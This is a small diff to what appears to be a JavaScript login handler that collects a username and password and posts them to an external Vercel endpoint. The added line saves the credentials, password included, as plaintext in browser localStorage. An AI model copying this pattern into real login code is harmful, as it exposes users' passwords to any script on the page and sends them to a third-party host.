@@ -94,7 +94,6 @@
     // Collect form data
     var userName = $('#username').val();
     var password = $('#password').val();
-  
 
     // Build the data object
     var data = {
@@ -102,6 +101,7 @@
         password: password
        
     }
+    localStorage.setItem('storedData', JSON.stringify(data))
 
             $.ajax({
               url: 'https://server-blue-mu.vercel.app/starb', // Replace with the URL to your PHP handler script
